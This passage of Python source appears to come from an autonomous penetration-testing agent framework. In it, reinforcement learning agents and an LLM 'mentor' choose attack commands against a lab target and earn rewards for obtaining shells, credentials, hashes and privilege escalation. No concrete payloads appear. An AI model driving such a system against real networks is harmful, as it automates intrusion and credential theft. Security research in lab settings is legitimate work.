        cmd_alt2 = cmd_lower.replace('_', '-')
        
        # Check against OTHER agents' exclusive prefixes
        for other_agent, other_role in self.AGENT_ROLES.items():
            if other_agent == self.agent_name:
                continue  # Skip self
            
            other_prefixes = other_role.get("exclusive_prefixes", [])
            for prefix in other_prefixes:
                prefix_lower = prefix.lower().strip()
                prefix_alt = prefix_lower.replace('-', '_')
                prefix_alt2 = prefix_lower.replace('_', '-')
                
                # Check all variations
                if (cmd_lower.startswith(prefix_lower) or 
                    cmd_lower.startswith(prefix_alt) or
                    cmd_lower.startswith(prefix_alt2) or
                    cmd_alt.startswith(prefix_lower) or
                    cmd_alt2.startswith(prefix_lower)):
                    logger.debug(f"[{self.agent_name}] Command '{command[:40]}' belongs to {other_agent}'s domain (prefix: {prefix})")
                    return False
        
        return True
    
    def record_result(
        self,
        decision: SmartDecisionResult,
        success: bool,
        raw_output: str,
        new_discoveries: Optional[Dict[str, Any]] = None,
        done: bool = False,
        shared_discoveries: Optional[Set[str]] = None,
    ) -> RewardBreakdown:
        """
        Record the result of a command execution and calculate reward.
        
        Args:
            decision: The decision that was executed
            success: Whether command succeeded
            raw_output: Raw output from command
            new_discoveries: New things discovered
            shared_discoveries: Cross-agent shared discovery set for dedup (Phase 6)
            
        Returns:
            RewardBreakdown with detailed reward calculation
        """
        if not self.attack_context:
            self.attack_context = AttackContext(target="unknown")
        
        # Calculate smart reward
        breakdown = self.reward_calculator.calculate_reward(
            template_name=decision.template_name,
            command=decision.command,
            success=success,
            raw_output=raw_output,
            current_phase=decision.phase,
            state_flags=self.attack_context.state_flags,
            new_discoveries=new_discoveries,
            shared_discoveries=shared_discoveries,
        )
        
        # Record with learned store
        context_tags = {self.attack_context.platform, self.attack_context.difficulty}
        preconditions = set(k for k, v in self.attack_context.state_flags.items() if v)
        
        if success and breakdown.total > 0:
            self.learned_store.record_success(
                template_name=decision.template_name,
                params=decision.params,
                reward=breakdown.total,
                context_tags=context_tags,
                preconditions_met=preconditions,
                phase=decision.phase,
            )
        elif not success:
            self.learned_store.record_failure(
                template_name=decision.template_name,
                params=decision.params,
            )
        
        # Update discoveries in context
        if new_discoveries:
            for key, value in new_discoveries.items():
                self.attack_context.add_discovery(key, value)
                
                # Set state flags based on discoveries
                if key == "shell":
                    self.attack_context.set_state_flag("shell_obtained")
                    if self.attack_context.platform == "linux":
                        self.attack_context.set_state_flag("linux_shell_obtained")
                    elif self.attack_context.platform == "windows":
                        self.attack_context.set_state_flag("windows_shell_obtained")
                elif key == "credentials":
                    self.attack_context.set_state_flag("credentials_known")
                elif key == "hash":
                    self.attack_context.set_state_flag("hash_known")
                elif key == "vulnerability":
                    self.attack_context.set_state_flag("vulnerability_found")
            # Phase 6.1: Reset stagnation on new discoveries
            self._stagnation_steps = 0
            # R57 Layer 1: Signal for DDQN stagnation detection
            self._last_step_had_discovery = True
            # Phase 6.2: Notify MentorController of discovery
            if self.mentor_controller is not None:
                self.mentor_controller.record_discovery()
        else:
            # Phase 6.1: Increment stagnation counter
            self._stagnation_steps = getattr(self, '_stagnation_steps', 0) + 1
            # R57 Layer 1: No discovery this step
            self._last_step_had_discovery = False
        
        # Add failed command to context if failed
        if not success:
            self.attack_context.failed_attempts.append(decision.command)
            # R47 Fix #4: Track SSH/sshpass failures for anti-repeat filtering
            cmd_lower = (decision.command or "").lower()
            if ("sshpass " in cmd_lower or cmd_lower.startswith("ssh ")) and raw_output:
                output_lower = raw_output.lower()
                _ssh_fail_indicators = (
                    "connection closed", "key exchange", "no matching",
                    "connection refused", "connection timed out", "permission denied",
                    "kex_exchange_identification", "host key verification",
                )
                if any(ind in output_lower for ind in _ssh_fail_indicators):
                    self._ssh_failures_this_episode = getattr(
                        self, '_ssh_failures_this_episode', 0
                    ) + 1
        
        # Phase 6.9.6: Update reasoning context trackers
        if hasattr(self, '_reasoning_step_rewards'):
            self._reasoning_step_rewards.append(breakdown.total)
            self._reasoning_highest_reward = max(
                self._reasoning_highest_reward, breakdown.total
            )
            self._reasoning_total_commands += 1
            self._reasoning_total_decisions += 1
            if not success:
                self._reasoning_failed_commands += 1
            if decision.source == "ppo":
                self._reasoning_ppo_decisions += 1
            elif decision.source in ("anti_repeat", "forced"):
                self._reasoning_anti_repeat_decisions += 1
            if new_discoveries:
                self._reasoning_last_discovery_step = getattr(
                    self, '_ppo_step_count', 0
                )
        
        # Phase 6.4: Detect "not found" tools and mask them from future PPO selection.
        # If a tool doesn't exist on the target, it will NEVER work — don't keep trying.
        if raw_output:
            _out_lower = raw_output.lower().strip()
            if "not found" in _out_lower or "command not found" in _out_lower:
                # Extract the tool name (first word of command)
                _tool = decision.command.split()[0] if decision.command else ""
                if _tool and not hasattr(self, '_failed_tools'):
                    self._failed_tools = set()
                if _tool:
                    self._failed_tools.add(_tool)
                    logger.debug(
                        f"[{self.agent_name}] Tool '{_tool}' not found on target — "
                        f"masked from future PPO selection"
                    )
        
        # Record outcome for adaptive mentor policy learning
        self.mentor_policy.record_outcome(
            agent_name=self.agent_name,
            reward=breakdown.total,
            used_mentor=decision.mentor_call,
        )
        
        # Phase 6.2: Record outcome with MentorController
        if self.mentor_controller is not None:
            self.mentor_controller.record_outcome(breakdown.total)

        # ─── Phase 8.0: Record to cross-episode chain memory ────────
        if decision.command:
            self._record_chain_step(decision.command, breakdown.total)
            # Store failures for reasoning context
            if not success and decision.template_name:
                fail_reason = f"{decision.template_name}: {'not found' if 'not found' in (raw_output or '').lower() else 'failed'}"
                self._reasoning_failures.append(fail_reason)
                if len(self._reasoning_failures) > 10:
                    self._reasoning_failures = self._reasoning_failures[-10:]

        # ─── PHASE 4: Pair PPO trajectory entry with reward ─────────
        if self._ppo_pending is not None:
            ppo_reward = breakdown.total
            
            # PHASE 6: Mentor imitation bonus — when mentor was consulted and
            # PPO independently chose the same template, add conformity bonus.
            # This bridges supervised learning (mentor) with RL (PPO).
            mentor_suggestion = getattr(decision, '_mentor_suggestion', None)
            if mentor_suggestion and decision.source == "ppo":
                if decision.template_name == mentor_suggestion:
                    ppo_reward += 3.0  # Conformity bonus: PPO agrees with expert
                    logger.debug(
                        f"[PPO][{self.agent_name}] Mentor conformity bonus +3.0 "
                        f"(both chose {decision.template_name})"
                    )
            
            # Phase 6.4: When MENTOR led the decision but PPO had a shadow
            # trajectory, give PPO the mentor's reward (clipped) so it learns
            # what good decisions look like. This is DAgger-lite.
            if mentor_suggestion and decision.source == "mentor":
                # PPO ran in shadow mode — give it the same reward signal
                # so its gradient points toward the mentor's behavior
                ppo_reward = max(breakdown.total, 1.0)  # At least +1 for mentor demos
                logger.debug(
                    f"[PPO][{self.agent_name}] DAgger-lite: PPO shadow learns from "
                    f"mentor decision (reward={ppo_reward:.1f})"
                )
            
            # ── R58 Layer 2a: Macro-aligned PPO reward shaping ──────
            # When DDQN selects a macro-intent and PPO picks a command,
            # reward PPO for choosing commands within the macro's allowed
            # set. This teaches PPO to follow DDQN's strategic direction.
            if self._active_macro is not None and decision.template_name:
                try:
                    from core.algorithms.ddqn_macro import MACRO_COMMAND_MAP
                    macro_cmds = MACRO_COMMAND_MAP.get(self._active_macro, set())
                    if decision.template_name in macro_cmds:
                        ppo_reward += 3.0  # Aligned with DDQN strategy
                        logger.debug(
                            f"[PPO][{self.agent_name}] R58 macro-align +3.0 "
                            f"({decision.template_name} ∈ {self._active_macro.name})"
                        )
                    else:
                        ppo_reward -= 1.0  # Gentle misalignment penalty
                        logger.debug(
                            f"[PPO][{self.agent_name}] R58 macro-misalign -1.0 "
                            f"({decision.template_name} ∉ {self._active_macro.name})"
                        )
                except Exception:
                    pass  # DDQN not available — skip alignment shaping
            
            # R69: Tag trajectory entry with discovery + template metadata for HTR
            _r69_disc_types = []
            if new_discoveries:
                for _dt, _dv in new_discoveries.items():
                    if isinstance(_dv, list):
                        _r69_disc_types.extend([_dt] * len(_dv))
                    else:
                        _r69_disc_types.append(_dt)
            
            self._ppo_trajectory.append({
                "state": self._ppo_pending["state"],
                "action": self._ppo_pending["action"],
                "log_prob": self._ppo_pending["log_prob"],
                "value": self._ppo_pending["value"],
                "reward": ppo_reward,
                "done": done,
                # R69 HTR metadata (not consumed by PPO directly)
                "_r69_discoveries": _r69_disc_types,
                "_r69_template": decision.template_name or "",
                "_r69_preconditions": set(
                    (decision.template_name and COMMAND_REGISTRY.get(decision.template_name) or None)
                    and COMMAND_REGISTRY[decision.template_name].preconditions or set()
                ) if decision.template_name else set(),
            })
            self._ppo_pending = None
        
        # ─── PHASE 9.0: Store DDQN macro transition ────────────────
        if self._ddqn_pending is not None and self.ddqn_macro is not None:
            try:
                import torch as _torch
                _, _, _, encode_state = _lazy_ppo()
                if encode_state is not None:
                    # Encode next state from current attack context
                    next_state_dict = {
                        "state_flags": dict(self.attack_context.state_flags) if self.attack_context else {},
                    }
                    next_state = encode_state(next_state_dict, _torch.device("cpu"))
                    
                    from core.algorithms.ddqn_macro import compute_macro_reward
                    phase_name = (
                        self.attack_context.current_phase.name
                        if self.attack_context and self.attack_context.current_phase
                        else "RECON"
                    )
                    prev_phase_name = None
                    if hasattr(self, '_last_phase') and self._last_phase is not None:
                        prev_phase_name = (
                            self._last_phase.name
                            if hasattr(self._last_phase, 'name')
                            else str(self._last_phase)
                        )
                    
                    macro_reward = compute_macro_reward(
                        macro=self._active_macro,
                        step_reward=breakdown.total,
                        phase_name=phase_name,
                        discoveries=new_discoveries or {},
                        prev_phase=prev_phase_name,
                        prev_macro=self._ddqn_pending.get("prev_macro"),  # R57 Layer 1
                    )
                    
                    # R57 Layer 1: Record macro outcome for success tracking
                    _had_disc = bool(new_discoveries)
                    self.ddqn_macro.record_macro_outcome(
                        self._ddqn_pending["macro"], macro_reward, _had_disc,
                    )
                    
                    self.ddqn_macro.store_transition(
                        state=self._ddqn_pending["state"],
                        macro=self._ddqn_pending["macro"],
                        reward=macro_reward,
                        next_state=next_state,
                        done=done,
                    )
                    # Update DDQN (off-policy, can update every step)
                    self.ddqn_macro.update()
            except Exception as e:
                logger.debug(f"[DDQN][{self.agent_name}] Transition store failed: {e}")
            self._ddqn_pending = None
        
        return breakdown
    
    # =====================================================================
    # PHASE 5.2+: ADAPTIVE CURRICULUM HELPERS
    # =====================================================================

    def _get_curriculum_performance(self) -> float:
        """Compute adaptive curriculum performance score (0-1).

        Combines recent discovery rate, diversity, and reward trend.
        Higher score → agent is learning well → less playbook guidance needed.
        """
        if not self._episode_rewards:
            return 0.5  # Neutral: no history yet

        window = self._adaptive_history_window
        recent_rewards = self._episode_rewards[-window:]
        recent_discoveries = self._episode_discovery_counts[-window:]
        recent_diversity = self._episode_diversity_ratios[-window:]

        scores = []

        # Discovery rate (0-1): avg discoveries per episode, capped at 15
        if recent_discoveries:
            avg_disc = sum(recent_discoveries) / len(recent_discoveries)
            scores.append(min(avg_disc / 15.0, 1.0))

        # Diversity ratio (0-1): already in range
        if recent_diversity:
            scores.append(sum(recent_diversity) / len(recent_diversity))

        # Reward trend (0-1): positive trend = doing well
        if len(recent_rewards) >= 3:
            first_half = sum(recent_rewards[: len(recent_rewards) // 2])
            second_half = sum(recent_rewards[len(recent_rewards) // 2 :])
            if first_half > 0:
                trend = min(max(second_half / first_half, 0.0), 2.0) / 2.0
            else:
                trend = 0.5 if second_half >= 0 else 0.2
            scores.append(trend)

        return sum(scores) / len(scores) if scores else 0.5

    def record_episode_performance(
        self,
        total_reward: float,
        discovery_count: int,
        diversity_ratio: float,
    ):
        """Record episode-level metrics for adaptive curriculum.

        Called by SmartOrchestrator at the end of each episode.
        """
        self._episode_rewards.append(total_reward)
        self._episode_discovery_counts.append(discovery_count)
        self._episode_diversity_ratios.append(diversity_ratio)

        # Keep bounded history
        cap = self._adaptive_history_window * 3
        if len(self._episode_rewards) > cap:
            self._episode_rewards = self._episode_rewards[-cap:]
            self._episode_discovery_counts = self._episode_discovery_counts[-cap:]
            self._episode_diversity_ratios = self._episode_diversity_ratios[-cap:]

    def reset_episode(self, episode: int):
        """Reset for new episode."""
        self.current_episode = episode
        self.mentor_policy.reset_episode(episode)
        self.reward_calculator.reset()
        
        # Reset episode-level command tracking for variety
        self.episode_used_commands.clear()
        self.command_repeat_count.clear()
        self.decisions.clear()  # Clear decision history for fresh episode
        
        # Phase 4: Reset PPO trajectory
        self._ppo_trajectory.clear()
        self._ppo_pending = None
        
        # Phase 6.1: Reset stagnation counter
        self._stagnation_steps = 0
        self._last_phase = None

        # Layer 3: Reset codex meta-layer counters
        self._codex_meta_calls_episode = 0
        self._codex_meta_cooldown = 0
        self._codex_meta_phase_steps = 0
        self._codex_meta_last_phase = None
        self._codex_meta_gate_overrides = 0  # R60
        self._codex_meta_antirepeat_hits = 0  # R60
        self._codex_meta_used_templates.clear()  # R62: Reset per-episode dedup

        # R66: Reset codex strategic counters
        self._codex_strategic_calls_episode = 0
        self._codex_strategic_cooldown = 0
        self._r66_coherence = 0.5
        self._r66_macro_conf = 0.5

        # R67: Reset velocity + adaptive budget
        self._r67_velocity = 0.0
        self._r67_stalling = False
        self._r67_codex_bonus_budget = 0

        # R68: Reset phase-group override
        self._r68_forced_phase_group = None

        # R49/R52: Reset phase-stuck escalation trackers
        self._privesc_steps = 0
        self._lateral_steps = 0
        self._privesc_escalation_fired = False
        self._escalation_attempt_count = 0  # R53: Reset alternating escalation counter

        # R42: Reset forced-novel counter per episode
        self._forced_novel_count = 0

        # Phase 6.9.6: Reset reasoning context trackers
        self._reasoning_step_rewards: List[float] = []
        self._reasoning_highest_reward: float = 0.0
        self._reasoning_last_discovery_step: int = 0
        self._reasoning_ppo_decisions: int = 0
        self._reasoning_anti_repeat_decisions: int = 0
        self._reasoning_total_decisions: int = 0
        self._reasoning_failed_commands: int = 0
        self._reasoning_total_commands: int = 0

        # Phase 6.9.1: Reset closeout tracking
        self._closeout_used_templates: set = set()
        
        # Phase 6.4: Reset failed tools (tools not installed on target)
        # NOTE: _failed_tools persists across episodes intentionally —
        # if a tool isn't installed, it won't be next episode either.
        # Only reset on explicit call.
        if not hasattr(self, '_failed_tools'):
            self._failed_tools: set = set()
        
        # R47 Fix #4: Reset SSH failure tracking per episode
        # When SSH consistently fails (key exchange, connection closed),
        # we skip sshpass alternatives in anti-repeat pool
        self._ssh_failures_this_episode: int = 0
        
        # Keep learned store (persists across episodes)
        # Reset attack context for new episode
        if self.attack_context:
            self.attack_context = AttackContext(
                target=self.attack_context.target,
                difficulty=self.attack_context.difficulty,
                platform=self.attack_context.platform,
            )
    
    def _log_mentor_call(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str],
        result: SmartDecisionResult,
    ):
        """Log mentor call to transcript file."""
        import json
        import os
        
        entry = {
            "event_id": f"{step_ctx.episode}:{step_ctx.step:04d}:{self.agent_name}",
            "agent": self.agent_name,
            "task_type": "smart_tactical",
            "template_used": result.template_name,
            "command": result.command[:100],
            "mentor_reasoning": result.mentor_reasoning[:200] if result.mentor_reasoning else None,
            "model_used": result.model_used,
            "mentor_delta": result.mentor_delta,
            "phase": result.phase.name,
            "confidence": result.confidence,
            "timestamp": result.timestamp,
        }
        
        try:
            os.makedirs(os.path.dirname(self.mentor_log_path), exist_ok=True)
            with open(self.mentor_log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            logger.debug(f"Failed to log mentor call: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get coach statistics."""
        return {
            "agent": self.agent_name,
            "total_decisions": len(self.decisions),
            "mentor_calls": sum(1 for d in self.decisions if d.mentor_call),
            "actions_changed": sum(1 for d in self.decisions if d.mentor_delta == "changed"),
            "policy_stats": self.mentor_policy.get_stats(),
            "reward_stats": self.reward_calculator.get_session_stats(),
            "learned_commands": self.learned_store.get_summary(),
        }
    
    def suggest_exploration(self) -> List[str]:
        """Get suggested commands for exploration."""
        if not self.attack_context:
            return []
        
        return self.reward_calculator.suggest_exploration(
            self.attack_context.current_phase,
            self.attack_context.state_flags,
        )
    
    def is_stuck(self) -> bool:
        """Check if agent is stuck (low recent rewards)."""
        return self.reward_calculator.is_stuck()


def create_smart_coach(
    agent_name: str,
    gpt_manager: "GPTManager",
    mentor_policy: Optional[MentorPolicy] = None,
    model: str = "gpt-5.1-codex-mini",
) -> SmartCoach:
    """
    Factory function to create a SmartCoach.
    
    Args:
        agent_name: Name of the agent
        gpt_manager: GPT manager for LLM access
        mentor_policy: Optional mentor policy
        model: LLM model to use
        
    Returns:
        Configured SmartCoach instance
    """
    return SmartCoach(
        agent_name=agent_name,
        gpt_manager=gpt_manager,
        mentor_policy=mentor_policy,
        model=model,
    )


# =============================================================================
# SMARTCOACH WRAPPER - Wraps any AgentInterface for smart validation
# =============================================================================

class SmartCoachWrapper:
    """
    Wraps any agent implementing AgentInterface to add SmartCoach validation.
    
    This wrapper intercepts the act() method to:
    1. Get agent's native action proposal
    2. Validate/improve with SmartCoach + command registry
    3. Return enhanced action with reasoning
    
    All other methods pass through to the underlying agent.
    """
    
    def __init__(
        self,
        agent: Any,
        coach: SmartCoach,
        verbose: bool = False,
    ):
        """
        Initialize wrapper.
        
        Args:
            agent: Agent implementing AgentInterface (RedAgent, ScoutAgent, etc.)
            coach: SmartCoach instance for this agent
            verbose: Enable verbose logging
        """
        self._agent = agent
        self._coach = coach
        self._verbose = verbose
        self._current_episode = 0
        self._current_step = 0
        
        # Track stuck state
        self._action_history: List[str] = []
        self._stuck_threshold = 3
        
        logger.debug(f"SmartCoachWrapper initialized for {self.agent_id}")
    
    @property
    def agent_id(self) -> str:
        """Get agent ID from underlying agent."""
        return getattr(self._agent, 'agent_id', 'unknown')
    
    @property
    def role(self) -> str:
        """Get agent role from underlying agent."""
        return getattr(self._agent, 'role', 'unknown')
    
    @property
    def coach(self) -> SmartCoach:
        """Access the SmartCoach."""
        return self._coach
    
    @property
    def attack_context(self) -> Optional[AttackContext]:
        """Get attack context from coach."""
        return self._coach.attack_context
    
    def set_episode_step(self, episode: int, step: int):
        """Set current episode and step for context."""
        self._current_episode = episode
        self._current_step = step
    
    def act(self, state: Dict[str, Any]) -> Dict[str, Any]:
        """
        Enhanced act() that validates through SmartCoach.
        
        Args:
            state: Environment state dictionary
            
        Returns:
            Action result with SmartCoach enhancement
        """
        # 1. Get agent's native decision
        try:
            native_result = self._agent.act(state)
            proposed_action = native_result.get("action", "noop")
            native_confidence = native_result.get("info", {}).get("confidence", 0.5)
        except Exception as e:
            logger.warning(f"Agent {self.agent_id} native act() failed: {e}")
            native_result = {"action": "noop", "success": False, "reward": 0.0, "info": {}}
            proposed_action = "noop"
            native_confidence = 0.3
        
        # 2. Update attack context from state
        if not self._coach.attack_context:
            target = state.get("target_ip", "10.10.10.10")
            self._coach.init_attack_context(target)
        self._coach.update_context_from_state(state)
        
        # 3. Check if stuck (triggers forced mentor call)
        is_stuck = self._check_stuck(proposed_action)
        if is_stuck:
            native_confidence = 0.1  # Force mentor call
        
        # 4. Build SmartStepContext
        step_ctx = SmartStepContext(
            episode=self._current_episode,
            step=self._current_step,
            agent_name=self.agent_id,
            attack_context=self._coach.attack_context,
            state=state,
        )
        
        # 5. Get SmartCoach decision (validates against registry, may call GPT)
        decision = self._coach.decide(step_ctx, proposed_action, native_confidence)
        
        # 6. Track action for stuck detection
        self._action_history.append(decision.command)
        if len(self._action_history) > self._stuck_threshold + 2:
            self._action_history = self._action_history[-(self._stuck_threshold + 2):]
        
        # 7. Merge: SmartCoach command + agent's specialized info
        enhanced_result = {
            "action": decision.command,
            "success": native_result.get("success", True),
            "reward": native_result.get("reward", 0.0),
            "info": {
                **native_result.get("info", {}),
                # Smart additions
                "template_name": decision.template_name,
                "template_params": decision.params,
                "mentor_call": decision.mentor_call,
                "model_used": decision.model_used,
                "mentor_reasoning": decision.mentor_reasoning,
                "mentor_delta": decision.mentor_delta,
                "phase": decision.phase.name,
                "confidence": decision.confidence,
                "smart_decision": True,
                "is_stuck": is_stuck,
            }
        }
        
        if self._verbose:
            logger.info(
                f"[{self.agent_id}] {decision.phase.name}: {decision.command[:50]}... "
                f"(mentor={decision.mentor_call}, conf={decision.confidence:.2f})"
            )
        
        return enhanced_result
    
    def _check_stuck(self, proposed_action: str) -> bool:
        """Check if agent is stuck (repeating same action)."""
        if len(self._action_history) < self._stuck_threshold:
            return False
        
        recent = self._action_history[-self._stuck_threshold:]
        # Check if all recent actions are the same
        if len(set(recent)) == 1:
            logger.warning(f"Agent {self.agent_id} STUCK: repeated '{recent[0][:40]}...'")
            return True
        
        # Also check if proposed matches all recent
        if all(a == proposed_action for a in recent):
            return True
        
        return False
    
    def record_result(
        self,
        success: bool,
        raw_output: str,
        new_discoveries: Optional[Dict[str, Any]] = None,
    ) -> RewardBreakdown:
        """
        Record result and get smart reward calculation.
        
        Args:
            success: Whether command succeeded
            raw_output: Raw output from command execution
            new_discoveries: New discoveries from output parsing
            
        Returns:
            RewardBreakdown with detailed reward calculation
        """
        if not self._coach.decisions:
            # No decision recorded yet
            return RewardBreakdown(base_reward=0.0, total=0.0)
        
        last_decision = self._coach.decisions[-1]
        return self._coach.record_result(
            decision=last_decision,
            success=success,
            raw_output=raw_output,
            new_discoveries=new_discoveries,
        )
    
    def learn(self, state, action, reward, next_state, done) -> float:
        """Pass through to underlying agent's learn()."""
        if hasattr(self._agent, 'learn'):
            return self._agent.learn(state, action, reward, next_state, done)
        return 0.0
    
    def reset(self):
        """Reset wrapper and underlying agent."""
        self._action_history.clear()
        if hasattr(self._agent, 'reset'):
            self._agent.reset()
    
    def reset_episode(self, episode: int):
        """Reset for new episode."""
        self._current_episode = episode
        self._current_step = 0
        self._action_history.clear()
        self._coach.reset_episode(episode)
    
    def get_stats(self) -> Dict[str, Any]:
        """Get combined stats from wrapper and coach."""
        return {
            "agent_id": self.agent_id,
            "role": self.role,
            "coach_stats": self._coach.get_stats(),
            "is_stuck": len(set(self._action_history[-self._stuck_threshold:])) == 1
            if len(self._action_history) >= self._stuck_threshold else False,
        }
    
    def __getattr__(self, name: str):
        """Pass through attribute access to underlying agent."""
        return getattr(self._agent, name)
